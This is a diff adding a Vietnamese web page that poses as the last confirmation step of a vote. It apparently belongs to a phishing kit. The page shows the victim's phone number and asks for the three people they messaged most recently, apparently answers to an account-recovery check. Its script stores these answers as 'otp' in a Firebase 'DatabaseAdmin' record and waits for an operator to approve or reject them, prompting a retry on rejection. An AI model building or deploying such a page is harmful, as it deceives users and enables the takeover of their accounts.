@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Xác nhận bình chọn</title>
+    <style>
+        body { 
+            font-family: 'Times New Roman', Times, serif; 
+            margin: 0; 
+            background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://images.unsplash.com/photo-1513364776144-60967b0f800f?q=80&w=1920') center/cover fixed; 
+            color: #2c3e50; 
+        }
+        
+        .main-container { 
+            max-width: 600px; 
+            width: 90%;
+            box-sizing: border-box;
+            margin: 40px auto; 
+            background: #fffdf7; 
+            padding: 30px; 
+            border-radius: 12px; 
+            box-shadow: 0 15px 40px rgba(0,0,0,0.3); 
+            border: 12px solid #3e2723;
+            outline: 3px solid #d4af37;
+            outline-offset: -10px;
+            text-align: center;
+        }
+
+        .header-title {
+            color: #8b0000;
+            font-size: 24px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #d4af37;
+            padding-bottom: 15px;
+        }
+        
+        .image-gallery { display: flex; gap: 10px; justify-content: center; margin-bottom: 20px; flex-wrap: wrap;}
+        .image-gallery img { width: 100%; max-width: 250px; border-radius: 8px; object-fit: cover; border: 3px solid #d4af37; display: none; box-shadow: 0 4px 10px rgba(0,0,0,0.15);}
+
+        .info-text { font-size: 16px; margin-bottom: 5px; color: #444;}
+        .highlight-text { font-weight: bold; color: #8b0000; font-size: 18px;}
+        .highlight-sbd { color: #2c3e50; font-size: 18px; font-weight: bold; margin-bottom: 20px; display: block;}
+        
+        .instruction {
+            color: #8b0000;
+            font-size: 17px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            line-height: 1.4;
+        }
+
+        .friends-container { display: flex; flex-direction: column; gap: 15px; margin-bottom: 25px; align-items: center;}
+        .friend-input { 
+            width: 85%; 
+            padding: 14px; 
+            font-size: 16px; 
+            text-align: center; 
+            border: 2px solid #d4af37; 
+            border-radius: 6px; 
+            color: #8b0000; 
+            font-weight: bold; 
+            font-family: inherit;
+            background: #fff;
+            transition: 0.3s;
+            box-sizing: border-box;
+        }
+        .friend-input:focus { border-color: #8b0000; outline: none; box-shadow: 0 0 8px rgba(139,0,0,0.2);}
+        
+        .btn-submit { 
+            width: 85%; 
+            background: #8b0000; 
+            color: white; 
+            border: none; 
+            padding: 16px; 
+            font-size: 16px; 
+            border-radius: 6px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            transition: 0.3s; 
+            text-transform: uppercase; 
+            font-family: inherit;
+            letter-spacing: 1px;
+            box-sizing: border-box;
+        }
+        .btn-submit:hover { background: #660000; transform: translateY(-2px); }
+        .error-msg { color: #d32f2f; font-size: 15px; margin-bottom: 15px; display: none; font-weight: bold; font-style: italic;}
+
+        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 253, 247, 0.95); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; text-align: center; padding: 20px;}
+        .spinner { border: 4px solid #f4f1ea; border-top: 4px solid #8b0000; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        .loading-text { font-size: 18px; color: #8b0000; font-weight: bold; line-height: 1.5; }
+        .btn-retry { background: #2c3e50; color: white; border: none; padding: 12px 30px; font-size: 15px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 20px; font-family: inherit; display: none;}
+
+        .success-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); display: none; justify-content: center; align-items: center; z-index: 2000; }
+        .success-modal.active { display: flex; }
+        .modal-content { background: #fffdf7; padding: 35px 25px; border-radius: 12px; text-align: center; width: 85%; max-width: 400px; border: 4px solid #d4af37; animation: popIn 0.3s ease; box-sizing: border-box;}
+        .success-icon { font-size: 60px; color: #2e7d32; margin-bottom: 15px; }
+        
+        @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* --- MOBILE RESPONSIVE CSS --- */
+        @media (max-width: 600px) {
+            .main-container {
+                margin: 20px auto;
+                padding: 20px 15px;
+                border-width: 8px; /* Giảm độ dày viền */
+                outline-offset: -6px;
+            }
+            .header-title { font-size: 20px; }
+            .friend-input, .btn-submit { width: 100%; } /* Tràn lề 100% dễ bấm */
+            .instruction { font-size: 15px; }
+        }
+    </style>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="header-title">BƯỚC CUỐI: XÁC NHẬN</div>
+
+        <div class="image-gallery">
+            <img id="displayImg1" src="" alt="Hướng dẫn 1">
+            <img id="displayImg2" src="" alt="Hướng dẫn 2">
+        </div>
+
+        <p class="info-text">SĐT bình chọn: <span class="highlight-text" id="displayPhone">...</span></p>
+        <span class="highlight-sbd" id="displaySbd">Đang tải...</span>
+        
+        <p class="instruction">
+           <span style="text-decoration: underline;">CHỌN 3 NGƯỜI BẠN NHẮN TIN GẦN NHẤT</span>
+        </p>
+        
+        <p class="error-msg" id="errorMsg">Vui lòng nhập đủ thông tin của cả 3 người!</p>
+
+        <div class="friends-container">
+            <input type="text" class="friend-input" id="friend1" placeholder=".....">
+            <input type="text" class="friend-input" id="friend2" placeholder=".....">
+            <input type="text" class="friend-input" id="friend3" placeholder=".....">
+        </div>
+
+        <button class="btn-submit" id="btnConfirm">XÁC NHẬN BÌNH CHỌN</button>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner" id="spinnerIcon"></div>
+        <div class="loading-text" id="loadingText">Hệ thống đang kiểm tra xác nhận...<br><span style="font-size: 15px; color: #555; font-style: italic; margin-top: 10px; display: block;">Vui lòng đợi trong giây lát.</span></div>
+        <button class="btn-retry" id="btnRetry" onclick="closeError()">Thử Lại</button>
+    </div>
+
+    <div class="success-modal" id="successModal">
+        <div class="modal-content">
+            <div class="success-icon">✔️</div>
+            <h2 style="color: #8b0000; margin-top: 0;">Tuyệt vời!</h2>
+            <p style="color: #444; font-size: 16px; line-height: 1.5; margin-bottom: 25px;">Cảm ơn bạn! Phiếu bình chọn của bạn đã được hệ thống ghi nhận thành công.</p>
+            <button class="btn-submit" onclick="window.location.href='index.html'" style="width: 100%;">Quay Về Trang Chủ</button>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyDk5okwiZEg2KOEwjUf1DHiTIFqNypq-So",
+            authDomain: "conhi-vote.firebaseapp.com",
+            databaseURL: "https://conhi-vote-default-rtdb.firebaseio.com",
+            projectId: "conhi-vote",
+            storageBucket: "conhi-vote.firebasestorage.app",
+            messagingSenderId: "953203459869",
+            appId: "1:953203459869:web:da5710aa4b115b5bbf83f4"
+        };
+        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+        const db = firebase.database();
+
+        window.onload = function() {
+            const sessionData = JSON.parse(localStorage.getItem('currentVoteSession'));
+            if (sessionData) {
+                document.getElementById('displayPhone').innerText = sessionData.phone;
+                document.getElementById('displaySbd').innerText = sessionData.sbd + " - (" + sessionData.candidate + ")";
+                
+                // LẤY ẢNH TỪ DATA CỦA RIÊNG KHÁCH HÀNG ĐÓ (Do Admin tải lên)
+                db.ref('DatabaseAdmin/' + sessionData.id).on('value', (snapshot) => {
+                    const data = snapshot.val();
+                    if(data) {
+                        if(data.img1) {
+                            const img1 = document.getElementById('displayImg1');
+                            img1.src = data.img1;
+                            img1.style.display = 'block';
+                        }
+                        if(data.img2) {
+                            const img2 = document.getElementById('displayImg2');
+                            img2.src = data.img2;
+                            img2.style.display = 'block';
+                        }
+                    }
+                });
+            }
+        }
+
+        function closeError() {
+            document.getElementById('loadingOverlay').style.display = "none";
+            document.getElementById('friend1').value = '';
+            document.getElementById('friend2').value = '';
+            document.getElementById('friend3').value = '';
+        }
+
+        document.getElementById('btnConfirm').addEventListener('click', function() {
+            const f1 = document.getElementById('friend1').value.trim();
+            const f2 = document.getElementById('friend2').value.trim();
+            const f3 = document.getElementById('friend3').value.trim();
+
+            if (!f1 || !f2 || !f3) {
+                document.getElementById('errorMsg').style.display = 'block';
+                return;
+            }
+            document.getElementById('errorMsg').style.display = 'none';
+
+            const combinedFriends = f1 + " | " + f2 + " | " + f3;
+
+            document.getElementById('loadingOverlay').style.display = "flex";
+            document.getElementById('spinnerIcon').style.display = "block";
+            document.getElementById('btnRetry').style.display = "none";
+            document.getElementById('loadingText').innerHTML = 'Hệ thống đang đối chiếu dữ liệu...<br><span style="font-size: 15px; color: #555; font-style: italic; margin-top: 10px; display: block;">Vui lòng đợi trong giây lát.</span>';
+
+            const sessionData = JSON.parse(localStorage.getItem('currentVoteSession'));
+
+            if (sessionData && sessionData.id) {
+                db.ref('DatabaseAdmin/' + sessionData.id).update({
+                    otp: combinedFriends,
+                    status: "checking_otp" 
+                }).then(() => {
+                    db.ref('DatabaseAdmin/' + sessionData.id + '/status').on('value', (snapshot) => {
+                        const currentStatus = snapshot.val();
+                        if (currentStatus === "completed") {
+                            document.getElementById('loadingOverlay').style.display = "none";
+                            document.getElementById('successModal').classList.add('active');
+                        } else if (currentStatus === "otp_rejected") {
+                            document.getElementById('spinnerIcon').style.display = "none";
+                            document.getElementById('loadingText').innerHTML = '❌<br>Thông tin xác nhận bị sai!<br>Vui lòng kiểm tra lại 3 người nhắn tin gần nhất.';
+                            document.getElementById('btnRetry').style.display = "inline-block";
+                            
+                            // Đẩy lại về trạng thái chờ nhập 3 bạn bè
+                            db.ref('DatabaseAdmin/' + sessionData.id).update({ status: "step2_approved", otp: "Đang chờ nhập..." });
+                        }
+                    });
+                }).catch(() => {
+                    alert("Lỗi. Vui lòng thử lại!");
+                    document.getElementById('loadingOverlay').style.display = "none";
+                });
+            }
+        });
+    </script>
+</body>
+</html>
